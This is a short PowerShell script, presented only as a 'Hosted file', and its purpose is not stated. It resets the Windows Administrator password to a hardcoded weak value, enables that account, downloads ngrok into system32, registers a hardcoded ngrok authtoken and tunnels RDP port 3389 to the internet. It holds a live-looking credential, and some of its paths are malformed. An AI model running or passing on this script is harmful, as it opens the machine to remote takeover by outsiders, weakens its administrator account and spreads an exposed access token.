Hosted file:
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Youtube1234" -Force)
Set-LocalUser -Name "Administrator" | Enable-LocalUser
Invoke-Webrequest https:bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
tar xf ngrok.zip
Copy ngrok.exe C:Windows\system32
cmd /c echo ./ngrok.exe authtoken "24dx7DKvOgLRuLnqCATvDB7GFSx_4Y4nvKdKtMmoDGWf6JJ2R" >a.ps1
cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
